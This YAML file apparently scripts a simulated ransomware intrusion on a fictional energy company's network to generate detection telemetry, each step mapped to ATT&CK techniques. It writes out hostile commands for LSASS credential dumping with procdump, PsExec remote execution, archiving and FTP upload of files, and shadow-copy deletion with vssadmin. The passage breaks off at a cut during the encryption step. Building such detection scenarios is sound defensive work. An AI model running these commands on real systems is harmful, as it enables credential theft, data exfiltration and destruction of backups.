time_window:
  start: "2024-06-03T08:00:00Z"
  duration: "4h"
  warmup: "1h"

baseline_activity:
  description: |
    Normal Monday pipeline operations: VPN reconnects for remote operators, finance
    reporting, IT maintenance windows, mail flow, backup traffic to file servers,
    and modest suspicious background noise across corporate and server segments.
  intensity: high
  variation: high
  suspicious_noise: medium
  traffic_rates:
    web: low
    user_activity: medium
    persona_connections: low
    smb_interval: low

observation_profile: enterprise_standard
logon_grace_period: "45m"

storyline:
  # Step 1 (+0:03) — compromised VPN authentication
  - id: evt-001
    time: "+3m"
    actor: t.morgan
    system: VPN-GW-01
    activity: "Attacker authenticates to corporate VPN using compromised operations account"
    events:
      - type: connection
        source_ip: "198.18.50.33"
        dst_ip: "10.60.10.10"
        dst_port: 1194
        service: ssl
        technique: "T1133 - External Remote Services"
        description: "VPN session establishment from external attacker IP"
      - type: ssh_session
        source_ip: "198.18.50.33"
        technique: "T1078 - Valid Accounts"
        description: "Successful VPN portal/administrative session using stolen credentials"

  # Step 2 (+0:18) — domain and share reconnaissance
  - id: evt-002
    time: "+18m"
    actor: t.morgan
    system: WKS-OPS-01
    activity: "Attacker enumerates Active Directory trusts and visible file servers"
    events:
      - type: rdp_session
        source_ip: "10.60.10.10"
        technique: "T1078 - Valid Accounts"
        description: "RDP pivot from VPN concentrator to operations workstation"
      - type: process
        process_name: "C:\\Windows\\System32\\nltest.exe"
        command_line: "nltest /dclist:colonial-energy"
        technique: "T1018 - Remote System Discovery"
        description: "Domain controller enumeration via nltest"
      - type: process
        process_name: "C:\\Windows\\System32\\net.exe"
        command_line: "net view /domain:colonial-energy"
        technique: "T1087 - Account Discovery"
        description: "Domain-visible resource enumeration"

  # Step 3 (+0:34) — LSASS credential access
  - id: evt-003
    time: "+34m"
    actor: t.morgan
    system: WKS-OPS-01
    activity: "Attacker dumps credentials from LSASS using bundled tooling"
    events:
      - type: process
        process_name: "C:\\Windows\\Temp\\procdump64.exe"
        command_line: "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ops-lsass.dmp"
        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
        description: "LSASS memory dump staged on the operations workstation"
      - type: create_remote_thread
        target_process: "lsass.exe"
        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
        description: "In-process credential access against LSASS"

  # Step 4a (+0:46) — PsExec remote execution from operations workstation
  - id: evt-004
    time: "+46m"
    actor: t.morgan
    system: WKS-OPS-01
    activity: "Attacker launches PsExec against the primary file server"
    events:
      - type: process
        process_name: "C:\\Windows\\Temp\\PsExec.exe"
        command_line: "PsExec.exe \\\\FS-01 -accepteula -s cmd.exe /c whoami"
        technique: "T1569.002 - System Services: Service Execution"
        description: "PsExec remote execution probe against primary file server"

  # Step 4b (+0:47) — PsExec helper service on target file server
  - id: evt-004b
    time: "+47m"
    actor: t.morgan
    system: FS-01
    activity: "PsExec installs its remote helper service on FS-01"
    events:
      - type: service_installed
        service_name: "PSEXESVC"
        service_file_name: "C:\\Windows\\PSEXESVC.exe"
        service_account: "LocalSystem"
        technique: "T1569.002 - System Services: Service Execution"
        description: "Remote PsExec helper service installed on target host"

  # Step 5a (+0:52) — SMB admin-auth to FS-01
  - id: evt-005
    time: "+52m"
    actor: t.morgan
    system: FS-01
    activity: "Attacker uses recovered admin credentials for SMB access to FS-01"
    event_spacing:
      mode: automated
      min_delay: "1s"
      max_delay: "4s"
    events:
      - type: explicit_credentials
        target_username: "COLONIAL-ENERGY\\s.kim"
        target_server: "FS-01"
        process_name: "C:\\Windows\\System32\\net.exe"
        source_ip: "10.60.20.21"
        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
        description: "Explicit credential use for administrative share access to FS-01"
      - type: logon
        source_ip: "10.60.20.21"
        logon_type: 3
        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
        description: "Network logon on FS-01 using stolen domain admin context"

  # Step 5b (+0:54) — SMB admin-auth to FS-02
  - id: evt-005b
    time: "+54m"
    actor: t.morgan
    system: FS-02
    activity: "Attacker extends SMB administrative access to FS-02"
    events:
      - type: logon
        source_ip: "10.60.20.21"
        logon_type: 3
        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
        description: "Network logon on FS-02 using stolen domain admin context"

  # Step 6a (+1:10) — archive sensitive shares on FS-01
  - id: evt-006a
    time: "+1h10m"
    actor: t.morgan
    system: FS-01
    activity: "Attacker archives finance and SCADA-adjacent documents from FS-01"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        command_line: >-
          powershell.exe -NoProfile -Command "Compress-Archive -Path
          \\\\FS-01\\Finance,\\\\FS-01\\Engineering\\SCADA-Exports -DestinationPath
          C:\\Windows\\Temp\\stage-fs01.zip -Force"
        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
        description: "Bulk archive of high-value shares on FS-01"
      - type: process
        process_name: "C:\\Windows\\System32\\xcopy.exe"
        command_line: "xcopy C:\\Windows\\Temp\\stage-fs01.zip \\\\FS-01\\Staging\\ /Y"
        technique: "T1005 - Data from Local System"
        description: "Archive copied into staging directory on FS-01"

  # Step 6b (+1:18) — copy staged archive to Linux FTP staging server
  - id: evt-006b
    time: "+1h18m"
    actor: t.morgan
    system: FS-01
    activity: "Attacker transfers staged archive to internal FTP staging server"
    events:
      - type: connection
        dst_ip: "10.60.30.40"
        dst_port: 21
        service: ftp
        technique: "T1048 - Exfiltration Over Alternative Protocol"
        description: "FTP control connection from FS-01 staging host to FTP-01"
      - type: process
        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        command_line: >-
          powershell.exe -NoProfile -Command "$client = New-Object Net.WebClient;
          $client.UploadFile('ftp://10.60.30.40/incoming/stage-fs01.zip',
          'C:\\Windows\\Temp\\stage-fs01.zip')"
        technique: "T1005 - Data from Local System"
        description: "Staged archive uploaded to FTP-01 incoming directory"

  # Step 7 (+1:36) — dual-channel exfiltration
  - id: evt-007
    time: "+1h36m"
    actor: ftp-staging
    system: FTP-01
    activity: "Attacker exfiltrates staged archive over FTP and HTTPS to external infrastructure"
    events:
      - type: connection
        source_ip: "10.60.30.40"
        dst_ip: "203.0.113.88"
        dst_port: 21
        service: ftp
        orig_bytes: 524288000
        resp_bytes: 4096
        technique: "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
        description: "Large outbound FTP transfer of staged archive"
      - type: connection
        source_ip: "10.60.30.40"
        dst_ip: "203.0.113.90"
        dst_port: 443
        hostname: "cdn-pipeline-updates.com"
        service: ssl
        orig_bytes: 262144000
        resp_bytes: 8192
        technique: "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
        description: "Secondary HTTPS exfiltration channel to attacker-controlled endpoint"

  # Step 8 (+2:00) — delete volume shadow copies
  - id: evt-008
    time: "+2h"
    actor: t.morgan
    system: FS-01
    activity: "Attacker deletes volume shadow copies before encryption"
    events:
      - type: process
        process_name: "C:\\Windows\\System32\\vssadmin.exe"
        command_line: "vssadmin.exe delete shadows /all /quiet"
        technique: "T1490 - Inhibit System Recovery"
        description: "Shadow copy deletion on primary file server"

  # Step 9a (+2:06) — encrypt FS-01
  - id: evt-009a
    time: "+2h6m"
    actor: t.morgan
    system: FS-01
    activity: "Ransomware encryptor deployed against FS-01 shares"
    events:
      - type: process
